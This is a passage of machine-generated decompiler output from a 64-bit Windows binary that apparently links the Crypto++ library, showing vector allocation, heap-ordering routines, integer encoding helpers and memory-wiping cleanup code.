  v2 = *a1;
  v3 = a2;
  v4 = a1;
  v5 = (*(__int64 (**)(void))(*a1 + 56))();
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(v2 + 128))(v4, v3, v5);
}

//----- (000000014004C1B0) ----------------------------------------------------
__int64 __fastcall sub_14004C1B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi

  v4 = a2;
  v5 = a1;
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 24i64))(a1, a3, a4);
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v5 + 96i64))(v5, v4);
}

//----- (000000014004C1F0) ----------------------------------------------------
__int64 __fastcall sub_14004C1F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rsi

  v5 = a3;
  v6 = a2;
  v7 = a1;
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 24i64))(a1, a4, a5);
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v7 + 128i64))(v7, v6, v5);
}

//----- (000000014004C240) ----------------------------------------------------
__int64 __fastcall sub_14004C240(__int64 a1)
{
  __int64 result; // rax
  _QWORD *v2; // rcx

  result = *(_QWORD *)(a1 + 16);
  if ( result )
  {
    v2 = (_QWORD *)(*(_QWORD *)(a1 + 24) + 8 * (result - 1));
    do
    {
      if ( *v2 )
        break;
      --v2;
      --result;
    }
    while ( result );
  }
  return result;
}

//----- (000000014004C270) ----------------------------------------------------
__int64 sub_14004C270()
{
  char v1; // [rsp+8h] [rbp+8h]

  return sub_14004B4E0(&v1);
}
// 14004B4E0: using guessed type __int64 __fastcall sub_14004B4E0(_QWORD);

//----- (000000014004C280) ----------------------------------------------------
char __fastcall sub_14004C280(_QWORD *a1, unsigned __int64 a2)
{
  char result; // al
  _QWORD *v3; // rbx
  signed __int64 v4; // rdi
  char *v5; // rax

  result = 0;
  v3 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x3FFFFFFFFFFFFFFFi64 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v4 = 4 * a2;
    v5 = (char *)operator new(4 * a2);
    if ( !v5 )
    {
      std::_Xbad_alloc();
      JUMPOUT(*(_QWORD *)&byte_14004C2F3);
    }
    *v3 = v5;
    v3[1] = v5;
    v3[2] = &v5[v4];
    result = 1;
  }
  return result;
}
// 14004C2F3: using guessed type char;
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014004C300) ----------------------------------------------------
char __fastcall sub_14004C300(_QWORD *a1, unsigned __int64 a2, _DWORD *a3)
{
  _DWORD *v3; // rbx
  unsigned __int64 v4; // rdi
  _QWORD *v5; // rsi
  signed __int64 v6; // rax
  _DWORD *v7; // rcx
  unsigned __int64 v8; // r8
  _DWORD *i; // rdx

  v3 = a3;
  v4 = a2;
  v5 = a1;
  LOBYTE(v6) = sub_14004C280(a1, a2);
  if ( (_BYTE)v6 )
  {
    v7 = (_DWORD *)*v5;
    v8 = v4;
    for ( i = (_DWORD *)*v5; v8; --v8 )
    {
      *i = *v3;
      ++i;
    }
    v6 = (signed __int64)&v7[v4];
    v5[1] = v6;
  }
  return v6;
}

//----- (000000014004C370) ----------------------------------------------------
char *__fastcall sub_14004C370(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  __int64 v3; // rdi
  char *v4; // rbx
  __int64 v5; // r14
  char *result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x3FFFFFFFFFFFFFFFi64 || (v4 = (char *)operator new(4 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  memmove(v4, *(const void **)v3, 4i64 * ((*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 2));
  v5 = (*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 2;
  if ( *(_QWORD *)v3 )
    operator delete(*(void **)v3);
  *(_QWORD *)(v3 + 16) = &v4[4 * v2];
  result = &v4[4 * v5];
  *(_QWORD *)(v3 + 8) = result;
  *(_QWORD *)v3 = v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014004C440) ----------------------------------------------------
unsigned __int64 __fastcall sub_14004C440(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // r9
  __int64 v4; // rdx
  unsigned __int64 result; // rax
  signed __int64 v6; // r10
  __int64 v7; // r8
  unsigned __int64 v8; // r11
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rdx
  unsigned __int64 v11; // rdx

  v2 = a1[1];
  v3 = a2;
  v4 = a1[2];
  result = (a1[2] - v2) >> 2;
  if ( result < v3 )
  {
    v6 = 0x3FFFFFFFFFFFFFFFi64;
    v7 = (v2 - *a1) >> 2;
    if ( 0x3FFFFFFFFFFFFFFFi64 - v7 < v3 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v8 = v7 + v3;
    v9 = (v4 - *a1) >> 2;
    if ( v6 - (v9 >> 1) >= v9 )
    {
      v11 = (v9 >> 1) + v9;
      if ( v11 < v8 )
        v11 = v7 + v3;
      result = (unsigned __int64)sub_14004C370((__int64)a1, v11);
    }
    else
    {
      v10 = 0i64;
      if ( v8 > 0 )
        v10 = v7 + v3;
      result = (unsigned __int64)sub_14004C370((__int64)a1, v10);
    }
  }
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014004C4D0) ----------------------------------------------------
void *__fastcall sub_14004C4D0(void *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // rbx
  void *v6; // rsi
  void *v7; // rdx
  void *v8; // rdx
  void *v9; // rdx
  char v11; // [rsp+30h] [rbp-98h]
  __int64 v12; // [rsp+58h] [rbp-70h]
  void *v13; // [rsp+60h] [rbp-68h]
  __int64 v14; // [rsp+80h] [rbp-48h]
  void *v15; // [rsp+88h] [rbp-40h]
  __int64 v16; // [rsp+A8h] [rbp-20h]
  void *Memory; // [rsp+B0h] [rbp-18h]

  v4 = a3;
  v5 = a2;
  v6 = a1;
  sub_140023410(&v11, a4);
  sub_14004F630((__int64)&v11, v6, v5, v4);
  v7 = Memory;
  memset(Memory, 0, 8 * v16);
  free(v7);
  v8 = v15;
  memset(v15, 0, 8 * v14);
  free(v8);
  v9 = v13;
  memset(v13, 0, 8 * v12);
  free(v9);
  return v6;
}

//----- (000000014004C5A0) ----------------------------------------------------
_QWORD *__fastcall sub_14004C5A0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  int v3; // [rsp+40h] [rbp+8h]

  v1 = a1;
  v3 = 1;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_14004C300(a1, 1ui64, &v3);
  return v1;
}

//----- (000000014004C5E0) ----------------------------------------------------
void **__fastcall sub_14004C5E0(void **a1)
{
  void **v1; // rbx
  void **v2; // rax
  void *v4; // [rsp+30h] [rbp-28h]

  v1 = a1;
  v2 = sub_14004C630(&v4);
  sub_14003D080(v1, (const void **)v2, 840);
  if ( v4 )
    operator delete(v4);
  return v1;
}

//----- (000000014004C630) ----------------------------------------------------
void **__fastcall sub_14004C630(void **a1)
{
  void **v1; // rbx
  const void **v2; // rax
  void *v4; // [rsp+30h] [rbp-28h]

  v1 = a1;
  v2 = (const void **)sub_14004C5A0(&v4);
  sub_14003D080(v1, v2, 2);
  if ( v4 )
    operator delete(v4);
  return v1;
}

//----- (000000014004C680) ----------------------------------------------------
void __fastcall sub_14004C680(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r15
  void *v3; // r14
  unsigned __int64 v4; // rbx
  __int64 v5; // rsi
  void *v6; // rbp
  __int64 *v7; // rcx
  unsigned __int64 v8; // [rsp+50h] [rbp+8h]
  unsigned __int64 v9; // [rsp+58h] [rbp+10h]

  v2 = *(_QWORD *)(a1 + 8);
  v3 = *(void **)(a1 + 16);
  v4 = a2;
  v5 = a1;
  v8 = a2;
  v9 = v2;
  if ( v2 == a2 )
  {
    *(_QWORD *)(a1 + 16) = v3;
    *(_QWORD *)(a1 + 8) = a2;
  }
  else
  {
    sub_140025670(a2);
    if ( v4 )
      v6 = sub_14003A000(8 * v4);
    else
      v6 = 0i64;
    v7 = (__int64 *)&v8;
    if ( v4 >= v2 )
      v7 = (__int64 *)&v9;
    if ( v3 )
    {
      if ( v6 )
        memcpy_s(v6, 8 * *v7, v3, 8 * *v7);
    }
    memset(v3, 0, 8 * v2);
    free(v3);
    *(_QWORD *)(v5 + 16) = v6;
    *(_QWORD *)(v5 + 8) = v4;
  }
}

//----- (000000014004C750) ----------------------------------------------------
__int64 __fastcall sub_14004C750(__int64 a1, __int64 a2)
{
  __int64 v2; // r8
  __int64 v3; // r9
  __int64 v4; // r8
  __int64 result; // rax
  int v6; // ecx

  v2 = *(_QWORD *)(a1 + 16);
  v3 = a1;
  *(_QWORD *)(a1 + 16) = *(_QWORD *)(a2 + 16);
  *(_QWORD *)(a2 + 16) = v2;
  v4 = *(_QWORD *)(a1 + 24);
  *(_QWORD *)(a1 + 24) = *(_QWORD *)(a2 + 24);
  *(_QWORD *)(a2 + 24) = v4;
  result = *(unsigned int *)(a2 + 32);
  v6 = *(_DWORD *)(a1 + 32);
  *(_DWORD *)(v3 + 32) = result;
  *(_DWORD *)(a2 + 32) = v6;
  return result;
}

//----- (000000014004C790) ----------------------------------------------------
_QWORD *__fastcall sub_14004C790(_QWORD *a1, char *a2, size_t *a3)
{
  size_t v3; // r9
  _QWORD *v4; // rbx
  size_t *v5; // rax

  v3 = 0i64;
  v4 = a1;
  if ( *a2 )
  {
    v3 = -1i64;
    do
      ++v3;
    while ( a2[v3] );
  }
  v5 = sub_140053770(a3, 0i64, a2, v3);
  sub_140003CB0(v4, v5);
  return v4;
}

//----- (000000014004C7E0) ----------------------------------------------------
__int64 __fastcall sub_14004C7E0(__int64 a1, __int64 a2, _QWORD *a3, char a4)
{
  char v4; // bp
  _QWORD *v5; // r14
  __int64 v6; // rsi
  __int64 v7; // rdi
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  __int64 v10; // r14
  void (__fastcall ***v11)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v12)(_QWORD, signed __int64); // rcx

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = operator new(0x28ui64);
  v9 = v8;
  if ( v8 )
  {
    v8[1] = v6;
    *((_BYTE *)v8 + 16) = v4;
    *((_BYTE *)v8 + 17) = 0;
    v8[3] = 0i64;
    *v8 = &off_1400AB2F8;
    v8[4] = *v5;
  }
  else
  {
    v9 = 0i64;
  }
  v10 = *(_QWORD *)(v7 + 8);
  *(_QWORD *)(v7 + 8) = 0i64;
  v11 = (void (__fastcall ***)(_QWORD, signed __int64))v9[3];
  if ( v11 )
    (**v11)(v11, 1i64);
  v9[3] = v10;
  v12 = *(void (__fastcall ****)(_QWORD, signed __int64))(v7 + 8);
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(v7 + 8) = v9;
  *(_BYTE *)(v7 + 16) = v4;
  return v7;
}
// 1400AB2F8: using guessed type __int64 (__fastcall *off_1400AB2F8)(void *);

//----- (000000014004C8A0) ----------------------------------------------------
void __fastcall sub_14004C8A0(__int64 a1, int *a2, char a3, unsigned int a4, unsigned int a5)
{
  unsigned int v5; // er12
  char v6; // di
  int *v7; // rsi
  __int64 v8; // r15
  size_t v9; // r14
  unsigned int v10; // ebx
  _BYTE *v11; // rbp
  __int64 v12; // rax
  size_t v13; // rdx
  _BYTE *v14; // rdi
  __int64 v15; // rax
  size_t Size; // [rsp+20h] [rbp-58h]
  __int64 v17; // [rsp+28h] [rbp-50h]
  size_t v18; // [rsp+38h] [rbp-40h]
  _BYTE *v19; // [rsp+40h] [rbp-38h]
  char v20; // [rsp+80h] [rbp+8h]

  v17 = -2i64;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( !(*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 144i64))(a1, &v20) || v20 != v6 )
    sub_14003E950();
  if ( !(unsigned __int8)sub_14005FFF0(v8, &Size) )
    sub_14003E950();
  v9 = Size;
  v18 = Size;
  sub_1400255A0(Size);
  v10 = 0;
  if ( v9 )
    v11 = sub_14003A000(v9);
  else
    v11 = 0i64;
  v19 = v11;
  v12 = (*(__int64 (__fastcall **)(__int64, _BYTE *, size_t))(*(_QWORD *)v8 + 136i64))(v8, v11, Size);
  v13 = Size;
  if ( Size != v12 )
    sub_14003E950();
  v14 = v11;
  if ( Size > 4 )
  {
    while ( !*v14 )
    {
      Size = --v13;
      ++v14;
      if ( v13 <= 4 )
        goto LABEL_16;
    }
    if ( v13 > 4 )
      sub_14003E950();
  }
LABEL_16:
  *v7 = 0;
  if ( v13 )
  {
    v15 = 0i64;
    do
    {
      *v7 = (*v7 << 8) | (unsigned __int8)v14[v15];
      v15 = ++v10;
    }
    while ( v10 < v13 );
  }
  if ( *v7 < v5 || *v7 > a5 )
    sub_14003E950();
  memset(v11, 0, v9);
  free(v11);
}

//----- (000000014004C9F0) ----------------------------------------------------
signed __int64 __fastcall sub_14004C9F0(_QWORD *a1, int a2, char a3)
{
  _QWORD *v3; // rsi
  unsigned int v4; // ebx
  char *v5; // rax
  __int64 v6; // rax
  __int64 v7; // rdi
  signed __int64 v8; // rax
  char *v9; // rdx
  __int64 v10; // r8
  signed __int64 v11; // rbx
  char v13; // [rsp+30h] [rbp-28h]
  char v14; // [rsp+38h] [rbp-20h]
  char v15; // [rsp+39h] [rbp-1Fh]
  char v16; // [rsp+3Ah] [rbp-1Eh]
  char v17; // [rsp+3Bh] [rbp-1Dh]
  char v18; // [rsp+3Ch] [rbp-1Ch]
  char v19[3]; // [rsp+3Dh] [rbp-1Bh]

  v3 = a1;
  if ( a3 == 1 )
  {
    v4 = 1;
    v18 = -(a2 != 0);
  }
  else
  {
    v14 = 0;
    v18 = a2;
    v4 = 4;
    v15 = HIBYTE(a2);
    v16 = BYTE2(a2);
    v17 = BYTE1(a2);
    v5 = &v15;
    do
    {
      if ( *v5 )
        break;
      --v4;
      ++v5;
    }
    while ( v4 > 1 );
    if ( v19[-v4] < 0 )
      ++v4;
  }
  v6 = *a1;
  v13 = a3;
  (*(void (__fastcall **)(_QWORD *, char *, signed __int64))(v6 + 40))(a1, &v13, 1i64);
  v7 = v4;
  v8 = sub_140060690(v3, v4);
  v9 = &v19[-v4];
  v10 = v4;
  v11 = v8;
  (*(void (__fastcall **)(_QWORD *, char *, __int64, _QWORD, char))(*v3 + 40i64))(v3, v9, v10, 0i64, 1);
  return v7 + v11 + 1;
}
// 14004C9F0: using guessed type char var_1B[3];

//----- (000000014004CAF0) ----------------------------------------------------
__int64 __fastcall sub_14004CAF0(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 *v4; // rsi
  __int64 v5; // r15
  unsigned __int64 v6; // rdx
  __int64 v7; // rdi
  __int64 v8; // rbx
  __int64 v9; // rcx
  __int64 v10; // rax
  bool v11; // zf
  __int64 v12; // rax
  __int64 v13; // rax
  void *v14; // rdx
  __int64 v15; // rcx
  __int64 v16; // rdi
  void *v17; // rdx
  void *v18; // rdx
  char v20; // [rsp+8h] [rbp-61h]
  __int64 v21; // [rsp+18h] [rbp-51h]
  void *v22; // [rsp+20h] [rbp-49h]
  __int64 v23; // [rsp+28h] [rbp-41h]
  __int64 v24; // [rsp+30h] [rbp-39h]
  __int64 v25; // [rsp+40h] [rbp-29h]
  void *v26; // [rsp+48h] [rbp-21h]
  __int64 v27; // [rsp+58h] [rbp-11h]
  char v28; // [rsp+60h] [rbp-9h]
  __int64 v29; // [rsp+70h] [rbp+7h]
  void *Memory; // [rsp+78h] [rbp+Fh]
  __int64 v31; // [rsp+E0h] [rbp+77h]
  __int64 v32; // [rsp+E8h] [rbp+7Fh]

  v27 = -2i64;
  v4 = a2;
  v5 = a1;
  v6 = ((unsigned __int64)((unsigned __int128)((a4 - a3) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((a4 - a3) * (signed __int128)7378697629483820647i64) >> 64) >> 5);
  if ( v6 == 1 )
  {
    (*(void (__fastcall **)(__int64 *, __int64, __int64, __int64))(*v4 + 80))(v4, a1, a3, a3 + 40);
  }
  else if ( v6 == 2 )
  {
    (*(void (__fastcall **)(__int64 *, __int64, __int64, __int64, __int64, __int64))(*v4 + 88))(
      v4,
      a1,
      a3,
      a3 + 40,
      a3 + 80,
      a3 + 120);
  }
  else
  {
    sub_14003C210(&v20);
    sub_14003C210(&v24);
    v7 = v32;
    v8 = v32 - 80;
    v9 = v31;
    if ( (signed __int64)(((unsigned __int64)((unsigned __int128)((v32 - v31) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
                        + ((signed __int64)((unsigned __int128)((v32 - v31) * (signed __int128)7378697629483820647i64) >> 64) >> 5)) > 1 )
    {
      v23 = 0i64;
      sub_14004D070(v31, v32);
      v7 = v32;
      v9 = v31;
    }
    if ( (signed __int64)(((unsigned __int64)((unsigned __int128)((v7 - v9) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
                        + ((signed __int64)((unsigned __int128)((v7 - v9) * (signed __int128)7378697629483820647i64) >> 64) >> 5)) > 1 )
    {
      sub_14004D2D0(v9, v7);
      v9 = v31;
    }
    if ( !sub_14003CDA0(v9 + 40) )
    {
      do
      {
        sub_14003C670((__int64)&v24, v8 + 40);
        sub_140046420(v8 + 40, (__int64)&v20, (__int64)&v24, v31 + 40);
        v10 = sub_140049E30();
        v11 = (unsigned int)sub_140045A60((__int64)&v20, v10) == 0;
        v12 = *v4;
        if ( v11 )
        {
          (*(void (__fastcall **)(__int64 *, __int64, __int64))(v12 + 64))(v4, v31, v8);
        }
        else
        {
          v13 = (*(__int64 (__fastcall **)(__int64 *, char *, __int64, char *))(v12 + 80))(v4, &v28, v8, &v20);
          (*(void (__fastcall **)(__int64 *, __int64, __int64))(*v4 + 64))(v4, v31, v13);
          v14 = Memory;
          memset(Memory, 0, 8 * v29);
          free(v14);
        }
        v15 = v31;
        v16 = v32;
        if ( v31 != v32 )
        {
          sub_14004D4A0(v31, v32 - 80, 0i64, 0i64, 0i64);
          v16 = v32;
          v15 = v31;
        }
        if ( (signed __int64)(((unsigned __int64)((unsigned __int128)((v16 - v15)
                                                                    * (signed __int128)7378697629483820647i64) >> 64) >> 63)
                            + ((signed __int64)((unsigned __int128)((v16 - v15) * (signed __int128)7378697629483820647i64) >> 64) >> 5)) > 1 )
        {
          sub_14004D2D0(v15, v16);
          v15 = v31;
        }
      }
      while ( !sub_14003CDA0(v15 + 40) );
    }
    (*(void (__fastcall **)(__int64 *, __int64, __int64, __int64))(*v4 + 80))(v4, v5, v8, v8 + 40);
    v17 = v26;
    memset(v26, 0, 8 * v25);
    free(v17);
    v18 = v22;
    memset(v22, 0, 8 * v21);
    free(v18);
  }
  return v5;
}
// 14004D4A0: using guessed type __int64 __fastcall sub_14004D4A0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014004CDA0) ----------------------------------------------------
__int64 __fastcall sub_14004CDA0(__int64 a1, __int64 a2, _QWORD *a3, char a4)
{
  char v4; // bl
  _QWORD *v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v11; // [rsp+30h] [rbp-28h]
  void (__fastcall ***v12)(_QWORD, signed __int64); // [rsp+38h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = sub_140053D40((__int64)&v11);
  v9 = sub_14004C7E0(v8, v6, v5, v4);
  sub_140053CE0(v7, v9);
  if ( v12 )
    (**v12)(v12, 1i64);
  return v7;
}

//----- (000000014004CE30) ----------------------------------------------------
__int64 __fastcall sub_14004CE30(unsigned int *a1, unsigned int *a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // rdx
  unsigned int v4; // ecx
  unsigned int v5; // ecx
  char v7; // [rsp+28h] [rbp-80h]
  __int64 v8; // [rsp+38h] [rbp-70h]
  __int64 v9; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v10)(void *); // [rsp+50h] [rbp-58h]
  int v11; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v13; // [rsp+80h] [rbp-28h]
  __int64 v14; // [rsp+88h] [rbp-20h]

  v2 = *a2;
  v3 = *a1;
  if ( v3 > 4611686018427387902i64 - v2 )
  {
    v9 = 15i64;
    v8 = 0i64;
    v7 = 0;
    sub_140004F20(&v7, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v10);
    v10 = &off_1400A8798;
    v11 = 1;
    v14 = 15i64;
    v13 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v7, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v10 = &off_1400A8798;
    CxxThrowException(&v10, &_TI3_AVcls_001_CryptoPP__);
  }
  v4 = v3 + v2 - 1;
  if ( !(_DWORD)v2 || ((_DWORD)v2 - 1) & (unsigned int)v2 )
    v5 = v4 - v4 % (unsigned int)v2;
  else
    v5 = v4 - (v4 & (v2 - 1));
  return v5;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (000000014004CF50) ----------------------------------------------------
__int64 __fastcall sub_14004CF50(__int64 a1, signed __int64 a2, signed __int64 a3, __int64 a4)
{
  signed __int64 v4; // rbx
  __int64 v5; // r12
  signed __int64 v6; // r15
  signed __int64 v7; // r14
  __int64 v8; // rbp
  signed __int64 i; // r13

  v4 = 2 * a2 + 2;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  for ( i = a2; v4 < v6; v4 = 2 * v4 + 2 )
  {
    if ( (signed int)sub_140045A60(80 * v4 + v8 + 40, 80 * v4 + v8 - 40) < 0 )
      --v4;
    sub_14003C670(v8 + 80 * v7, v8 + 80 * v4);
    sub_14003C670(v8 + 80 * v7 + 40, v8 + 80 * v4 + 40);
    v7 = v4;
  }
  if ( v4 == v6 )
  {
    sub_14003C670(v8 + 80 * v7, 80 * v6 + v8 - 80);
    sub_14003C670(v8 + 80 * v7 + 40, 80 * v6 + v8 - 40);
    v7 = v6 - 1;
  }
  return sub_14004D3C0(v8, v7, i, v5);
}

//----- (000000014004D070) ----------------------------------------------------
void __fastcall sub_14004D070(__int64 a1, __int64 a2)
{
  __int64 v2; // rbp
  signed __int64 v3; // r12
  signed __int64 v4; // rax
  signed __int64 v5; // r15
  signed __int64 v6; // rbx
  __int64 v7; // r13
  signed __int64 v8; // r14
  signed __int64 i; // rdi
  signed __int64 j; // rbx
  signed __int64 v11; // rsi
  void *v12; // rdx
  void *v13; // rdx
  char v14; // [rsp+30h] [rbp-78h]
  __int64 v15; // [rsp+40h] [rbp-68h]
  void *v16; // [rsp+48h] [rbp-60h]
  char v17; // [rsp+58h] [rbp-50h]
  __int64 v18; // [rsp+68h] [rbp-40h]
  void *Memory; // [rsp+70h] [rbp-38h]
  signed __int64 v20; // [rsp+B0h] [rbp+8h]

  v2 = a1;
  v3 = ((unsigned __int64)((unsigned __int128)((a2 - a1) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((a2 - a1) * (signed __int128)7378697629483820647i64) >> 64) >> 5);
  v4 = v3 / 2;
  v5 = v4;
  if ( v4 > 0 )
  {
    v6 = 2 * v4 + 2;
    v7 = a1 + 80 * v4;
    do
    {
      --v5;
      v7 -= 80i64;
      v20 = v6 - 2;
      sub_14003C000((__int64)&v14, v7);
      sub_14003C000((__int64)&v17, v7 + 40);
      v8 = v5;
      for ( i = v6 - 2; i < v3; i = 2 * i + 2 )
      {
        if ( (signed int)sub_140045A60(80 * i + v2 + 40, 80 * i + v2 - 40) < 0 )
          --i;
        sub_14003C670(v2 + 80 * v8, v2 + 80 * i);
        sub_14003C670(v2 + 80 * v8 + 40, v2 + 80 * i + 40);
        v8 = i;
      }
      if ( i == v3 )
      {
        sub_14003C670(v2 + 80 * v8, 80 * v3 + v2 - 80);
        sub_14003C670(v2 + 80 * v8 + 40, 80 * v3 + v2 - 40);
        v8 = v3 - 1;
      }
      for ( j = (v8 - 1) / 2; v5 < v8; j = (j - 1) / 2 )
      {
        v11 = v2 + 80 * j;
        if ( (signed int)sub_140045A60(v11 + 40, (__int64)&v17) >= 0 )
          break;
        sub_14003C670(v2 + 80 * v8, v2 + 80 * j);
        sub_14003C670(v2 + 80 * v8 + 40, v11 + 40);
        v8 = j;
      }
      sub_14003C670(v2 + 80 * v8, (__int64)&v14);
      sub_14003C670(v2 + 80 * v8 + 40, (__int64)&v17);
      v12 = Memory;
      memset(Memory, 0, 8 * v18);
      free(v12);
      v13 = v16;
      memset(v16, 0, 8 * v15);
      free(v13);
      v6 = v20;
    }
    while ( v5 > 0 );
  }
}

//----- (000000014004D2D0) ----------------------------------------------------
void __fastcall sub_14004D2D0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rsi
  void *v4; // rdx
  void *v5; // rdx
  char v6; // [rsp+40h] [rbp-58h]
  __int64 v7; // [rsp+50h] [rbp-48h]
  void *v8; // [rsp+58h] [rbp-40h]
  char v9; // [rsp+68h] [rbp-30h]
  __int64 v10; // [rsp+78h] [rbp-20h]
  void *Memory; // [rsp+80h] [rbp-18h]

  v2 = a2;
  v3 = a1;
  sub_14003C000((__int64)&v6, a2 - 80);
  sub_14003C000((__int64)&v9, v2 - 40);
  sub_14003C670(v2 - 80, v3);
  sub_14003C670(v2 - 40, v3 + 40);
  sub_14004CF50(
    v3,
    0i64,
    ((signed __int64)((unsigned __int128)((v2 - v3 - 80) * (signed __int128)7378697629483820647i64) >> 64) >> 5)
  + ((unsigned __int64)((unsigned __int128)((v2 - v3 - 80) * (signed __int128)7378697629483820647i64) >> 64) >> 63),
    (__int64)&v6);
  v4 = Memory;
  memset(Memory, 0, 8 * v10);
  free(v4);
  v5 = v8;
  memset(v8, 0, 8 * v7);
  free(v5);
}

//----- (000000014004D3C0) ----------------------------------------------------
__int64 __fastcall sub_14004D3C0(__int64 a1, signed __int64 a2, signed __int64 a3, __int64 a4)
{
  signed __int64 v4; // rdi
  __int64 v5; // r15
  signed __int64 v6; // r12
  __int64 v7; // rbp
  signed __int64 i; // rbx
  signed __int64 v9; // rsi
  __int64 v10; // rdi

  v4 = a2;
  v5 = a4;
  v6 = a3;
  v7 = a1;
  for ( i = (a2 - 1) / 2; v6 < v4; i = (i - 1) / 2 )
  {
    v9 = v7 + 80 * i;
    if ( (signed int)sub_140045A60(v9 + 40, v5 + 40) >= 0 )
      break;
    v10 = v7 + 80 * v4;
    sub_14003C670(v10, v7 + 80 * i);
    sub_14003C670(v10 + 40, v9 + 40);
    v4 = i;
  }
  sub_14003C670(v7 + 80 * v4, v5);
  return sub_14003C670(v7 + 80 * v4 + 40, v5 + 40);
}

//----- (000000014004D5F0) ----------------------------------------------------
__int64 __fastcall sub_14004D5F0(_QWORD *a1, __int64 a2)
{
  __int64 result; // rax

  if ( a2 )
  {
    result = 0i64;
    do
    {
      if ( a1 )
      {
        *a1 = 0i64;
        a1[1] = 0i64;
        a1[2] = 0i64;
      }
      a1 += 3;
      --a2;
    }
    while ( a2 );
  }
  return result;
}

//----- (000000014004D640) ----------------------------------------------------
void __fastcall sub_14004D640(void *a1, __int64 a2)
{
  __int64 v2; // rdi
  char *v3; // rbx

  v2 = a2;
  v3 = (char *)a1;
  while ( v2 )
  {
    if ( v3 )
      sub_14003C210(v3);
    --v2;
    v3 += 40;
  }
}

//----- (000000014004D6A0) ----------------------------------------------------
__int64 __fastcall sub_14004D6A0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rdi
  __int64 v5; // rbx
  __int64 result; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  while ( v4 )
  {
    if ( v5 )
      result = sub_14003C000(v5, v3);
    --v4;
    v5 += 40i64;
  }
  return result;
}

//----- (000000014004D710) ----------------------------------------------------
__int64 __fastcall sub_14004D710(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 i; // rbx

  v3 = a3;
  v4 = a2;
  for ( i = a1; i != v4; i += 80i64 )
  {
    if ( v3 )
    {
      sub_14003C000(v3, i);
      sub_14003C000(v3 + 40, i + 40);
    }
    v3 += 80i64;
  }
  return v3;
}

//----- (000000014004D780) ----------------------------------------------------
__int64 __fastcall sub_14004D780(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 i; // rbx

  v3 = a3;
  v4 = a2;
  for ( i = a1; i != v4; i += 96i64 )
  {
    if ( v3 )
    {
      sub_14003C000(v3, i);
      sub_14003C000(v3 + 40, i + 40);
      *(_DWORD *)(v3 + 80) = *(_DWORD *)(i + 80);
      *(_DWORD *)(v3 + 84) = *(_DWORD *)(i + 84);
      *(_DWORD *)(v3 + 88) = *(_DWORD *)(i + 88);
      *(_BYTE *)(v3 + 92) = *(_BYTE *)(i + 92);
